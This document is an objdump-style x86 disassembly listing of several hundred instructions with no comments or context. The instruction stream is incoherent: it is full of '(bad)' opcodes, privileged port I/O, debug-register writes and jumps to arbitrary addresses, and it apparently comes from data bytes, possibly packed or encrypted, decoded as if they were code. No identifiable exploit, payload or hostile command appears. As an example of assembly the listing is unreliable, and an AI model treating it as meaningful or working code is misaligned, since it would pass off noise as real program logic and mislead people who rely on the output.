  40c673:	push   es
  40c674:	sbb    eax,0x2d3f6925
  40c679:	push   ebp
  40c67a:	adc    esi,DWORD PTR [ecx-0x50df355]
  40c680:	add    al,0x84
  40c682:	in     al,0x61
  40c684:	in     eax,0xea
  40c686:	bound  ebx,QWORD PTR [edx]
  40c688:	aaa    
  40c689:	out    0x8a,eax
  40c68b:	outs   dx,DWORD PTR ds:[esi]
  40c68c:	dec    edx
  40c68d:	jne    0x40c6e4
  40c68f:	xor    eax,0x76d861b8
  40c694:	xor    al,BYTE PTR [ebx+0x6d]
  40c697:	mov    ch,0xf
  40c699:	or     al,BYTE PTR [ebx]
  40c69b:	and    DWORD PTR ds:0x92fee554,edi
  40c6a1:	xchg   ebx,eax
  40c6a2:	jg     0x40c6af
  40c6a4:	mov    eax,0xea6c948b
  40c6a9:	imul   esp,DWORD PTR [eax],0x5a
  40c6ac:	rol    esp,1
  40c6ae:	jbe    0x40c6e8
  40c6b0:	adc    eax,0x7f799747
  40c6b5:	int    0xf7
  40c6b7:	jno    0x40c737
  40c6b9:	dec    edx
  40c6ba:	jl     0x40c6fa
  40c6bc:	inc    ebp
  40c6bd:	out    0xbf,al
  40c6bf:	add    al,0x53
  40c6c1:	pop    esi
  40c6c2:	sbb    ah,ch
  40c6c4:	pusha  
  40c6c5:	fidiv  DWORD PTR [edi+0x33]
  40c6c8:	jbe    0x40c6d1
  40c6ca:	cli    
  40c6cb:	push   0xcad8d5dc
  40c6d0:	mov    cl,ah
  40c6d2:	dec    ecx
  40c6d3:	lods   eax,DWORD PTR ds:[esi]
  40c6d4:	push   edx
  40c6d5:	jg     0x40c72d
  40c6d7:	(bad)  
  40c6d8:	jmp    0xa97ae48b
  40c6dd:	stc    
  40c6de:	jbe    0x40c676
  40c6e0:	(bad)  
  40c6e2:	addr16 push ecx
  40c6e4:	in     al,dx
  40c6e5:	mov    esi,0x4c5fb71b
  40c6ea:	or     al,0x3b
  40c6ec:	nop
  40c6ed:	pop    ss
  40c6ee:	inc    eax
  40c6ef:	call   0xcf2afef0
  40c6f4:	sar    dh,1
  40c6f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6f7:	jno    0x40c687
  40c6f9:	cmp    cl,BYTE PTR [ebp+0x5f]
  40c6fc:	aaa    
  40c6fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6fe:	sahf   
  40c6ff:	(bad)  
  40c700:	sti    
  40c701:	cdq    
  40c702:	adc    DWORD PTR [ebx-0x51],ecx
  40c705:	push   edx
  40c706:	pop    edx
  40c707:	and    al,0xc0
  40c709:	adc    al,0xcd
  40c70b:	and    bh,BYTE PTR [ebx-0x28]
  40c70e:	int    0xd4
  40c710:	(bad)  
  40c711:	pop    ebp
  40c712:	sbb    al,BYTE PTR [ebx]
  40c714:	cmp    eax,0xe469a1fc
  40c719:	pop    eax
  40c71a:	in     al,0x36
  40c71c:	and    al,ch
  40c71e:	and    dh,ch
  40c720:	ins    BYTE PTR es:[edi],dx
  40c721:	retf   0x2fdf
  40c724:	mov    BYTE PTR [ebx],bl
  40c726:	ins    BYTE PTR es:[edi],dx
  40c727:	jle    0x40c6de
  40c729:	in     al,0x31
  40c72b:	mov    dh,0x35
  40c72d:	adc    al,0x4e
  40c72f:	pushf  
  40c730:	cmc    
  40c731:	out    0x16,eax
  40c733:	adc    eax,0xef633660
  40c738:	nop
  40c739:	push   cs
  40c73a:	jmp    0x8af6b62e
  40c73f:	pop    es
  40c740:	clc    
  40c741:	sub    eax,0x7f513873
  40c747:	ds jmp 0xf98a:0xabf7ed9e
  40c74f:	dec    edx
  40c750:	add    dl,bl
  40c752:	xor    DWORD PTR [ebx+0x7a],ebp
  40c755:	inc    edx
  40c756:	pop    esi
  40c757:	xchg   BYTE PTR [eax+ecx*4],al
  40c75a:	mov    bl,0x4f
  40c75c:	xor    al,0x3c
  40c75e:	dec    DWORD PTR [edi+eiz*1]
  40c761:	xlat   BYTE PTR ds:[bx]
  40c763:	into   
  40c764:	stc    
  40c765:	mov    ebx,0x65c533f8
  40c76a:	add    al,0xcc
  40c76c:	adc    BYTE PTR [eax],ah
  40c76e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c76f:	call   0x79ec:0x2fddcc21
  40c776:	mov    dh,0x42
  40c778:	clc    
  40c779:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c77a:	xor    BYTE PTR [edi+0xb],0xbc
  40c77e:	out    dx,eax
  40c77f:	hlt    
  40c780:	arpl   sp,bx
  40c782:	cdq    
  40c783:	aaa    
  40c784:	in     al,0x96
  40c786:	or     al,0xbe
  40c788:	add    bh,BYTE PTR [ebp-0x1cf88549]
  40c78e:	popa   
  40c78f:	inc    eax
  40c790:	jge    0x40c7db
  40c792:	ja     0x40c73c
  40c794:	jmp    DWORD PTR [edi-0x26]
  40c797:	jne    0x40c7e1
  40c799:	bound  edi,QWORD PTR [ebx-0x7b]
  40c79c:	lock dec BYTE PTR fs:[eax]
  40c7a0:	mov    esi,ebx
  40c7a2:	test   DWORD PTR [edx],ecx
  40c7a4:	stos   DWORD PTR es:[edi],eax
  40c7a5:	cmc    
  40c7a6:	fld    QWORD PTR [edi+ecx*8]
  40c7a9:	push   0x2e6684d0
  40c7ae:	xor    BYTE PTR [esp+eax*4-0x54a8b8f1],bl
  40c7b5:	sbb    DWORD PTR [edx+eiz*8-0x20],edi
  40c7b9:	adc    eax,0xb5dca56e
  40c7be:	in     al,0x95
  40c7c0:	loope  0x40c771
  40c7c2:	sbb    al,0x47
  40c7c4:	or     eax,DWORD PTR ds:0xaa7a789b
  40c7ca:	mov    ch,dh
  40c7cc:	jp     0x40c7f4
  40c7ce:	jnp    0x40c791
  40c7d0:	and    DWORD PTR [esi+ebp*2],ecx
  40c7d3:	mov    ah,0x84
  40c7d5:	cmp    al,cl
  40c7d7:	fwait
  40c7d8:	sbb    BYTE PTR [ebx],al
  40c7da:	dec    edx
  40c7db:	mov    bl,0x5b
  40c7dd:	les    esp,FWORD PTR [eax+0x696674fb]
  40c7e3:	or     eax,0x17c6720e
  40c7e8:	jmp    0x40c843
  40c7ea:	inc    esp
  40c7eb:	shl    BYTE PTR [ebp-0x4d],0x94
  40c7ef:	neg    DWORD PTR [ebp-0x4]
  40c7f2:	adc    eax,0x540f2157
  40c7f7:	div    BYTE PTR [edx+0x27]
  40c7fa:	sbb    esi,DWORD PTR ss:[eax]
  40c7fd:	aad    0x5e
  40c7ff:	sar    esp,1
  40c801:	out    0x69,al
  40c803:	xor    DWORD PTR [edx],esi
  40c805:	or     DWORD PTR [edi],edx
  40c807:	frstor [edx]
  40c809:	fldcw  WORD PTR [edi]
  40c80b:	popf   
  40c80c:	pusha  
  40c80d:	cmp    ebp,edx
  40c80f:	sti    
  40c810:	jecxz  0x40c7c7
  40c812:	lods   eax,DWORD PTR ds:[esi]
  40c813:	inc    ebp
  40c814:	mov    esi,0x74c42e84
  40c819:	jbe    0x40c7d6
  40c81b:	dec    ebp
  40c81c:	popa   
  40c81d:	and    eax,0x2286ba7d
  40c822:	add    DWORD PTR [edi],0x4c53a617
  40c828:	jge    0x40c7e2
  40c82a:	adc    al,0x29
  40c82c:	ins    BYTE PTR es:[edi],dx
  40c82d:	rol    BYTE PTR [edi],cl
  40c82f:	(bad)  
  40c830:	jg     0x40c7eb
  40c832:	lock (bad) 
  40c834:	les    esi,FWORD PTR [edx+0x4d]
  40c837:	or     al,0xdf
  40c839:	mov    db0,eax
  40c83c:	sbb    DWORD PTR [ebp+0x47],0xffffff91
  40c840:	adc    dl,BYTE PTR [edi]
  40c842:	pop    ds
  40c843:	mov    eax,0x52324d9f
  40c848:	and    ebx,0x3b372445
  40c84e:	fiadd  WORD PTR [ebx-0x1d]
  40c851:	cmc    
  40c852:	fld    DWORD PTR [ebx-0x2d29ebe5]
  40c858:	push   esi
  40c859:	fsubr  QWORD PTR [ebx]
  40c85b:	out    0x7d,eax
  40c85d:	xchg   edx,eax
  40c85e:	(bad)  
  40c85f:	sbb    ebx,DWORD PTR [esi-0x63]
  40c862:	mov    edi,0xb41acca8
  40c867:	xor    DWORD PTR [edi+0x775cd0c5],ebx
  40c86d:	pop    es
  40c86e:	sub    ebx,DWORD PTR [esi]
  40c870:	jmp    0x7645f7cc
  40c875:	clc    
  40c876:	cmp    esi,DWORD PTR [edi+0x0]
  40c879:	jb     0x40c872
  40c87b:	mov    eax,0x9954601b
  40c880:	pop    esi
  40c881:	popf   
  40c882:	or     DWORD PTR [ebx-0xf8b76d4],0xffffffcc
  40c889:	nop
  40c88a:	repnz mov edi,0xc28d36db
  40c890:	mov    ch,0x68
  40c892:	jl     0x40c8ae
  40c894:	movntps XMMWORD PTR [edi],xmm0
  40c897:	pop    edx
  40c898:	sbb    eax,0x469e5825
  40c89d:	dec    edx
  40c89e:	push   ebp
  40c89f:	cmc    
  40c8a0:	das    
  40c8a1:	sbb    DWORD PTR [ecx-0x7420b58f],esi
  40c8a7:	int    0x58
  40c8a9:	retf   0x7109
  40c8ac:	sahf   
  40c8ad:	loopne 0x40c88d
  40c8af:	cmp    ecx,DWORD PTR [edi]
  40c8b1:	loop   0x40c844
  40c8b3:	sti    
  40c8b4:	jp     0x40c8a9
  40c8b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8b7:	mov    dl,0xb2
  40c8b9:	adc    edi,0x96f41c67
  40c8bf:	dec    ebx
  40c8c0:	stc    
  40c8c1:	inc    edx
  40c8c2:	fwait
  40c8c3:	mov    ds:0xb37f0dd2,al
  40c8c8:	push   ss
  40c8c9:	mov    DWORD PTR [ebp-0x2e21a7c1],ebx
  40c8cf:	sbb    BYTE PTR [eax+0x49e85a16],dh
  40c8d5:	(bad)  
  40c8d6:	sbb    ebp,ecx
  40c8d8:	push   esi
  40c8d9:	mov    bl,0x61
  40c8db:	xchg   ecx,eax
  40c8dc:	mov    esp,DWORD PTR [edi+0x73126afe]
  40c8e2:	out    dx,al
  40c8e3:	mov    ebp,0xfc798e39
  40c8e8:	int    0x10
  40c8ea:	adc    BYTE PTR [ecx-0x3a],bl
  40c8ed:	jecxz  0x40c90b
  40c8ef:	lods   eax,DWORD PTR ds:[esi]
  40c8f0:	std    
  40c8f1:	icebp  
  40c8f2:	mov    dl,0xad
  40c8f4:	es call 0xc553b07e
  40c8fa:	push   ebx
  40c8fb:	jne    0x40c8c1
  40c8fd:	repnz movs DWORD PTR es:[di],DWORD PTR ds:[si]
  40c900:	ret    0x62e
  40c903:	loop   0x40c92e
  40c905:	dec    esp
  40c906:	out    dx,eax
  40c907:	ins    BYTE PTR es:[edi],dx
  40c908:	inc    esp
  40c909:	add    DWORD PTR [bp+si+0x3e],0x16726de3
  40c911:	dec    esi
  40c912:	sub    DWORD PTR [edx+0x44e682ec],edi
  40c918:	cmp    ebx,edx
  40c91a:	mov    al,ds:0xa0113448
  40c91f:	mov    al,ds:0x95e24767
  40c924:	xchg   esi,eax
  40c925:	pop    esp
  40c926:	jno    0x40c952
  40c928:	shl    DWORD PTR [ebx-0x646b5f03],cl
  40c92e:	fisttp QWORD PTR [ecx+0x2b95f980]
  40c934:	in     al,dx
  40c935:	enter  0xf7b3,0x37
  40c939:	mov    cl,0xb9
  40c93b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c93c:	mov    DWORD PTR ds:0x899156fc,eax
  40c942:	jo     0x40c926
  40c944:	sub    BYTE PTR [ecx+eiz*1+0x79074ec8],0x70
  40c94c:	rol    bl,1
  40c94e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c94f:	(bad)  
  40c950:	rcr    esi,1
  40c952:	popf   
  40c953:	add    al,BYTE PTR [ebp-0x2beeaa2c]
  40c959:	test   esi,esi
  40c95b:	push   0x496ca304
  40c960:	pop    es
  40c961:	cld    
  40c962:	inc    edx
  40c963:	out    dx,eax
  40c964:	jecxz  0x40c9b1
  40c966:	and    BYTE PTR [eax+ecx*8+0x69],0x2b
  40c96b:	sbb    eax,0x81cc3492
  40c970:	jmp    0x40c8fc
  40c972:	and    eax,DWORD PTR [ebx]
  40c974:	mov    eax,ds:0xbe4da0df
  40c979:	sub    esp,eax
  40c97b:	sub    DWORD PTR [edx-0x6eb77975],ecx
  40c981:	test   DWORD PTR [ebx],ecx
  40c983:	push   0xa20cec14
  40c988:	jmp    0xccd5:0xaa7989c
  40c98f:	fwait
  40c990:	sar    BYTE PTR [ecx],1
  40c992:	cmp    eax,0x86f6710c
  40c997:	xor    dh,BYTE PTR [ecx-0xfc30935]
  40c99d:	test   BYTE PTR [edi],0xd7
  40c9a0:	mov    bl,0xf6
  40c9a2:	xchg   ecx,eax
  40c9a3:	add    cl,BYTE PTR ds:0x249bc317
  40c9a9:	popf   
  40c9aa:	pop    edx
  40c9ab:	out    0x88,al
  40c9ad:	repz mov WORD PTR [edi-0x3],?
  40c9b1:	jnp    0x40c97a
  40c9b3:	xchg   esp,eax
  40c9b4:	inc    dh
  40c9b6:	nop
  40c9b7:	int3   
  40c9b8:	cmp    al,0x15
  40c9ba:	shr    BYTE PTR [eax-0x4a99a7c0],0xbf
  40c9c1:	cld    
  40c9c2:	jl     0x40ca2e
  40c9c4:	xor    DWORD PTR [ecx+0x18],ecx
  40c9c7:	cdq    
  40c9c8:	mov    eax,ds:0xb6b236c1
  40c9cd:	iret   
  40c9ce:	sbb    BYTE PTR [esi-0x12],0x1c
  40c9d2:	imul   edi,DWORD PTR [ebx+0x1ce6cee5],0x8ae92b76
  40c9dc:	clc    
  40c9dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9de:	add    al,0xb1
  40c9e0:	cs retf 
  40c9e2:	pop    ecx
  40c9e3:	add    al,0x3c
  40c9e5:	lock movs DWORD PTR es:[edi],DWORD PTR es:[esi]
  40c9e8:	fnstcw WORD PTR ds:0x77005bd9
  40c9ee:	daa    
  40c9ef:	pop    ebp
  40c9f0:	loop   0x40ca01
  40c9f2:	xchg   DWORD PTR [esi],ecx
  40c9f4:	test   DWORD PTR [ecx+0x7dbc93d],eax
  40c9fa:	push   es
  40c9fb:	add    edx,DWORD PTR [ecx-0x163661e]
  40ca01:	sub    DWORD PTR [esi*4-0x7e11d57b],eax
  40ca08:	dec    eax
  40ca09:	inc    esi
  40ca0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca0b:	cmp    edx,edi
  40ca0d:	bound  esp,QWORD PTR [edi]
  40ca0f:	push   edx
  40ca10:	xor    ecx,DWORD PTR [edx+0x4f]
  40ca13:	fild   QWORD PTR [eax+0x2]
  40ca16:	pop    edx
  40ca17:	mov    eax,ds:0xa7bdf9d8
  40ca1c:	std    
  40ca1d:	hlt    
  40ca1e:	inc    ebx
  40ca1f:	fs loopne 0x40ca34
  40ca22:	aas    
  40ca23:	ds hlt 
  40ca25:	leave  
  40ca26:	out    dx,eax
  40ca27:	and    al,BYTE PTR [ebx+0x25]
  40ca2a:	or     al,0x32
  40ca2c:	ret    
  40ca2d:	xor    ah,ch
  40ca2f:	dec    ebp
  40ca30:	pop    es
  40ca31:	rcl    DWORD PTR [esp+ebp*8],0x8f
  40ca35:	sub    eax,0x1483034a
  40ca3a:	push   0x75ffcd5f
  40ca3f:	xlat   BYTE PTR ds:[ebx]
  40ca40:	in     eax,dx
  40ca41:	sbb    al,0x0
  40ca43:	cmp    al,0xb
  40ca45:	out    0xf6,al
  40ca47:	add    eax,0xb2fce1a6
  40ca4c:	inc    edx
  40ca4d:	sub    al,0x85
  40ca4f:	stos   DWORD PTR es:[edi],eax
  40ca50:	idiv   ah
  40ca52:	leave  
  40ca53:	and    DWORD PTR [ebx+0x48b223aa],edx
  40ca59:	popa   
  40ca5a:	mov    al,ds:0x78b195f7
  40ca5f:	adc    bh,BYTE PTR [ecx-0x4e598521]
  40ca65:	xor    bh,ch
  40ca67:	pop    esp
  40ca68:	cmp    al,0x9d
  40ca6a:	sbb    ebp,DWORD PTR [ebx]
  40ca6c:	(bad)  
  40ca6d:	jnp    0x40caa0
  40ca6f:	lods   eax,DWORD PTR ds:[esi]
  40ca70:	mov    edi,DWORD PTR [esi+esi*1-0x6f]
  40ca74:	daa    
  40ca75:	inc    edx
  40ca76:	mov    edx,ecx
  40ca78:	jno    0x40ca5b
  40ca7a:	ror    DWORD PTR [esp+edi*1],1
  40ca7d:	mov    es,ebp
  40ca7f:	mov    ds:0xcd60c17a,al
  40ca84:	leave  
  40ca85:	out    dx,al
  40ca86:	pop    esp
  40ca88:	mov    ah,0x57
  40ca8a:	addr16 push ss
  40ca8c:	push   ecx
  40ca8d:	mov    ds:0xcaf76a12,al
  40ca92:	pop    esp
  40ca93:	push   es
  40ca94:	cmp    al,0x46
  40ca96:	or     al,ah
  40ca98:	daa    
  40ca99:	cdq    
  40ca9a:	ret    0x3d89
  40ca9d:	pop    edx
  40ca9e:	or     DWORD PTR [eax-0x148799e8],0x15b9447b
  40caa8:	add    DWORD PTR [edx],ebp
  40caaa:	adc    ebx,esi
  40caac:	xchg   esp,eax
  40caad:	pop    esp
  40caae:	ja     0x40ca32
  40cab0:	ja     0x40ca62
  40cab2:	lahf   
  40cab3:	xchg   esi,eax
  40cab4:	arpl   WORD PTR [eax],bp
  40cab6:	(bad)  
  40cab7:	repz call 0xbeef663e
  40cabd:	jbe    0x40cad3
  40cabf:	mov    bh,0x96
  40cac1:	out    0xd7,al
  40cac3:	inc    esi
  40cac4:	icebp  
  40cac5:	dec    edi
  40cac6:	jo     0x40ca5e
  40cac8:	or     al,0xd1
  40caca:	test   BYTE PTR [edi+0x31],ch
  40cacd:	ins    DWORD PTR es:[edi],dx
  40cace:	fiadd  WORD PTR [esp+ebp*2-0x2c0bef26]
  40cad5:	(bad)  
  40cad6:	in     al,dx
  40cad7:	add    esi,esp
  40cad9:	push   edi
  40cada:	pop    ds
  40cadb:	xchg   edi,eax
  40cadc:	pop    ebx
  40cadd:	cld    
  40cade:	imul   esi,DWORD PTR [edx+0x3e],0xffffffa7
  40cae2:	mov    ds:0x6d20befd,al
  40cae7:	and    al,0xe4
  40cae9:	mov    bh,0xc7
  40caeb:	mov    cl,0xb
  40caed:	js     0x40ca74
  40caef:	mov    ebp,0xfe6ca161
  40caf4:	jb     0x40cb36
  40caf6:	(bad)  
  40caf8:	repz je 0x40cb40
  40cafb:	mov    fs,WORD PTR [eax+0x3029e1d]
  40cb01:	jle    0x40cb1f
  40cb03:	iret   
  40cb04:	aas    
  40cb05:	jno    0x40cb69
  40cb07:	inc    esp
  40cb08:	ja     0x40ca8a
  40cb0a:	mov    cl,0x86
  40cb0c:	or     ah,bl
  40cb0e:	enter  0x429,0x4d
  40cb12:	xchg   esp,eax
  40cb13:	ret    
  40cb14:	jmp    0x871a:0x22342aab
  40cb1b:	call   0x822f662f
  40cb20:	shl    eax,1
  40cb22:	add    eax,0xcc643a6f
  40cb27:	clc    
  40cb28:	out    0x7f,al
  40cb2a:	pop    ebx
  40cb2b:	xor    eax,DWORD PTR [ecx]
  40cb2d:	js     0x40cb1e
  40cb2f:	and    eax,0x5d7e120
  40cb34:	les    ebx,FWORD PTR [edi+esi*8-0x75fbe30d]
  40cb3b:	leave  
  40cb3c:	pop    DWORD PTR [edi-0xa]
  40cb3f:	jle    0x40cb4f
  40cb41:	clc    
  40cb42:	lahf   
  40cb43:	ret    
  40cb44:	rol    DWORD PTR [edi],0x8
  40cb47:	retf   0xea21
  40cb4a:	push   esi
  40cb4b:	fld    QWORD PTR [ecx+0x4943840f]
  40cb51:	ins    BYTE PTR es:[edi],dx
  40cb52:	or     ecx,DWORD PTR [esp+ebp*2+0x470c0e48]
  40cb59:	neg    BYTE PTR [ebp+0x4fad5a5e]
  40cb5f:	lahf   
  40cb60:	test   DWORD PTR [ebx+edx*2],ebx
  40cb63:	pop    esp
  40cb64:	xor    edi,DWORD PTR [eax-0x744e6693]
  40cb6a:	(bad)  
  40cb6b:	jecxz  0x40cb24
  40cb6d:	jbe    0x40cb90
  40cb6f:	pop    eax
  40cb70:	mov    eax,0xdec59f92
  40cb75:	lds    esp,FWORD PTR [esi+0x72e768a1]
  40cb7b:	pop    edi
  40cb7c:	out    dx,eax
  40cb7d:	test   edi,esp
  40cb7f:	sahf   
  40cb80:	jg     0x40cb3f
  40cb82:	fstp   TBYTE PTR [ebx-0x66]
  40cb85:	pop    ebx
  40cb86:	lods   eax,DWORD PTR es:[esi]
  40cb88:	je     0x40cbb5
  40cb8a:	cmp    DWORD PTR [ebp-0x60d735df],edx
  40cb90:	push   edx
  40cb91:	es aad 0x41
  40cb94:	(bad)  
  40cb95:	mov    esi,0x300c933e
  40cb9a:	mov    DWORD PTR [ecx+0x35e43696],ebp
  40cba0:	xchg   BYTE PTR [ebx],ch
  40cba2:	out    0x6f,al
  40cba4:	jmp    ecx
  40cba6:	retf   
  40cba7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cba8:	xor    bh,bl
  40cbaa:	jno    0x40cb5a
  40cbac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbad:	call   FWORD PTR [edx]
  40cbaf:	jl     0x40cbd6
  40cbb1:	xchg   edi,eax
  40cbb2:	ret    0xf251
  40cbb5:	jae    0x40cb91
  40cbb7:	cmp    bh,BYTE PTR [edx-0x38]
  40cbba:	int3   
  40cbbb:	fs out dx,al
  40cbbd:	mov    eax,ds:0xca0bd966
  40cbc2:	mul    esp
  40cbc4:	stos   BYTE PTR es:[edi],al
  40cbc5:	cld    
  40cbc6:	add    BYTE PTR [esi],0x48
  40cbc9:	fild   WORD PTR [ebp-0x5ff8f77b]
  40cbcf:	fdivr  QWORD PTR [ebp+0xc93ecb8]
  40cbd5:	mov    edi,DWORD PTR [ecx+0x3]
  40cbd8:	jnp    0x40cb91
  40cbda:	dec    edx
  40cbdb:	dec    esp
  40cbdc:	mov    cl,BYTE PTR [ecx]
  40cbde:	mov    al,ds:0xa5f478c2
  40cbe3:	in     al,dx
  40cbe4:	ficomp WORD PTR [ecx+eax*8-0x10]
  40cbe8:	cmp    esi,ecx
  40cbea:	(bad)  
  40cbeb:	out    dx,al
  40cbec:	mov    dl,0x80
  40cbee:	(bad)  
  40cbef:	cdq    
  40cbf0:	and    DWORD PTR [edi],0xa0688b9b
  40cbf6:	loope  0x40cc42
  40cbf8:	outs   dx,BYTE PTR ds:[esi]
  40cbf9:	es inc edi
  40cbfb:	xchg   edi,eax
  40cbfc:	int3   
  40cbfd:	sub    BYTE PTR [ecx],bh
  40cbff:	inc    esi
  40cc00:	arpl   WORD PTR [ecx+0x51],ax
  40cc03:	loopne 0x40cc46
  40cc05:	test   eax,0x137dab09
  40cc0a:	or     eax,DWORD PTR [ebx-0x3ff0ce15]
  40cc10:	mov    BYTE PTR [edi-0x6ac7d2f3],dh
  40cc16:	push   ds
  40cc17:	lods   al,BYTE PTR ds:[esi]
  40cc18:	push   es
  40cc19:	and    ch,BYTE PTR [ebp-0x8a20903]
  40cc1f:	sub    eax,DWORD PTR [ecx]
  40cc21:	cli    
  40cc22:	adc    ch,bl
  40cc24:	bnd jbe 0x40cbe5
  40cc27:	pop    ebp
  40cc28:	xrstors [ebx-0x2a]
  40cc2c:	gs (bad) 
  40cc2e:	mul    ebx
  40cc30:	pop    esi
  40cc31:	or     al,0x23
  40cc33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc34:	inc    ebx
  40cc35:	sar    DWORD PTR [ecx+esi*1-0x52645276],0xdd
  40cc3d:	ret    
  40cc3e:	mov    esp,0x6c54c93d
  40cc43:	or     eax,0xee0deef5
  40cc48:	fisubr DWORD PTR [ebx+ebp*4+0x55]
  40cc4c:	stc    
  40cc4d:	jbe    0x40cca9
  40cc4f:	xor    DWORD PTR [edi],edx
  40cc51:	push   cs
  40cc52:	pop    ds
  40cc53:	push   ss
  40cc54:	adc    eax,0xbe45fcb6
  40cc59:	push   edx
  40cc5a:	daa    
  40cc5b:	test   cl,cl
  40cc5d:	stos   DWORD PTR es:[edi],eax
  40cc5e:	in     eax,dx
  40cc5f:	sub    edx,DWORD PTR [ecx-0x6a0b8d24]
  40cc65:	imul   edi,eax,0xdcf429ce
  40cc6b:	pop    ds
  40cc6c:	add    al,0xa7
  40cc6e:	ret    
  40cc6f:	xchg   esi,eax
  40cc70:	add    eax,DWORD PTR [ebx-0x45]
  40cc73:	aas    
  40cc74:	mov    al,0x3f
  40cc76:	cmp    al,0x81
  40cc78:	ja     0x40cca4
  40cc7a:	mov    ah,0xcb
  40cc7c:	out    0x12,eax
  40cc7e:	mov    cl,0xc
  40cc80:	fs mov bl,0x17
  40cc83:	mov    ds:0xd4755257,eax
  40cc88:	shl    BYTE PTR [edi-0x64],cl
  40cc8b:	aam    0x49
  40cc8d:	(bad)  
  40cc8e:	xlat   BYTE PTR ds:[ebx]
  40cc8f:	and    ch,BYTE PTR ds:0x8f98e57d
  40cc95:	sbb    esi,DWORD PTR [edx+0x10]
  40cc98:	test   BYTE PTR ds:0x5617d85f,ah
  40cc9e:	aas    
  40cc9f:	dec    eax
  40cca0:	ret    
  40cca1:	fcos   
  40cca3:	and    ah,BYTE PTR [eax]
  40cca5:	xlat   BYTE PTR ds:[ebx]
  40cca6:	inc    esp
  40cca7:	cli    
  40cca8:	(bad)  
  40cca9:	loope  0x40cc2f
  40ccab:	jmp    0x40cd26
  40ccad:	adc    ah,ah
  40ccaf:	mov    BYTE PTR [ebp+0x39685bf1],dl
  40ccb5:	das    
  40ccb6:	lods   eax,DWORD PTR es:[esi]
  40ccb8:	scas   al,BYTE PTR es:[edi]
  40ccb9:	pushf  
  40ccba:	bswap  ebx
  40ccbc:	pop    ebx
  40ccbd:	cmp    eax,0xc55609b5
  40ccc2:	mov    ebx,0x15f4bc2f
  40ccc7:	pushf  
  40ccc8:	neg    BYTE PTR [esi-0x54]
  40cccb:	icebp  
  40cccc:	xor    ebp,DWORD PTR [eax]
  40ccce:	mov    cl,0x13
  40ccd0:	repnz mov eax,DWORD PTR [ebx]
  40ccd3:	xchg   ebx,eax
  40ccd4:	push   ebx
  40ccd5:	push   esp
  40ccd6:	je     0x40cce3
  40ccd8:	pop    esi
  40ccd9:	mov    ebp,0x92da4c86
  40ccde:	jns    0x40cce9
  40cce0:	jb     0x40cd2a
  40cce2:	ret    0xff60
  40cce5:	iret   
  40cce6:	fldpi  
  40cce8:	pop    ecx
  40cce9:	mov    ds:0x3c050080,al
  40ccee:	fisub  DWORD PTR [ebx+0x77]
  40ccf1:	add    ebx,esp
  40ccf3:	lock into 
  40ccf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccf6:	jmp    FWORD PTR [edi-0x6c94376c]
  40ccfc:	test   BYTE PTR [edx+0x2be42721],cl
  40cd02:	stc    
  40cd03:	and    BYTE PTR [eax-0x559841a7],bl
  40cd09:	push   ecx
  40cd0a:	cdq    
  40cd0b:	aam    0xb0
  40cd0d:	test   edi,ebp
  40cd0f:	xchg   edi,eax
  40cd10:	(bad)  
  40cd11:	test   al,0x63
  40cd13:	in     eax,dx
  40cd14:	inc    dx
  40cd16:	inc    ecx
  40cd17:	popa   
  40cd18:	mov    al,ds:0xa27dd223
  40cd1d:	and    DWORD PTR [edi],0x67
  40cd20:	sbb    DWORD PTR [eax+0x456098bb],ebp
  40cd26:	xchg   ebx,eax
  40cd27:	fadd   st,st(1)
  40cd29:	loop   0x40cd0b
  40cd2b:	ss leave 
  40cd2d:	mov    eax,0x49c08717
  40cd32:	int3   
  40cd33:	dec    esp
  40cd34:	loopne 0x40cda8
  40cd36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd37:	js     0x40cda4
  40cd39:	add    esi,DWORD PTR [edi]
  40cd3b:	repz icebp 
  40cd3d:	call   0xb2c7:0xe23c1cff
  40cd44:	pop    esi
  40cd45:	sub    ch,BYTE PTR [edi+0x2d5c02c6]
  40cd4b:	push   ebp
  40cd4c:	in     al,0xc1
  40cd4e:	mov    al,0x12
  40cd50:	(bad)  
  40cd51:	ret    
  40cd52:	push   ebp
  40cd53:	scas   eax,DWORD PTR es:[edi]
  40cd54:	pop    edi
  40cd55:	shl    esp,cl
  40cd57:	sub    edi,DWORD PTR [esi+0x66]
  40cd5a:	mov    cs,esi
  40cd5c:	mov    ?,WORD PTR [ebx]
  40cd5e:	stos   DWORD PTR es:[edi],eax
  40cd5f:	add    BYTE PTR [edx-0x66],al
  40cd62:	arpl   sp,di
  40cd64:	mov    ebx,DWORD PTR [ebp+0xa]
  40cd67:	dec    BYTE PTR [eax+0x464ec538]
  40cd6d:	jae    0x40ccf6
  40cd6f:	pushf  
  40cd70:	loope  0x40cdc2
  40cd72:	mov    ebx,0x7a54bb5
  40cd77:	mov    cl,bl
  40cd79:	mov    esi,0x9cbf349a
  40cd7e:	push   ss
  40cd7f:	mov    ah,0xe
  40cd81:	jae    0x40cd97
  40cd83:	ja     0x40ce04
  40cd85:	(bad)  
  40cd86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd87:	rol    BYTE PTR [edx+0x2e4911b1],0x8e
  40cd8e:	les    eax,FWORD PTR [ebx]
  40cd90:	rol    BYTE PTR [eax],0x83
  40cd93:	lds    edi,FWORD PTR [edx+0x43bee051]
  40cd99:	(bad)  
  40cd9a:	cmc    
  40cd9b:	iret   
  40cd9c:	adc    ebp,esp
  40cd9e:	push   edx
  40cd9f:	sub    al,0xf5
  40cda1:	leave  
  40cda2:	jp     0x40cd81
  40cda4:	xchg   ebx,eax
  40cda5:	rcl    DWORD PTR ds:0xac21685d,0xa8
  40cdac:	cs loopne 0x40cda6
  40cdaf:	data16 fild DWORD PTR [ecx-0x26]
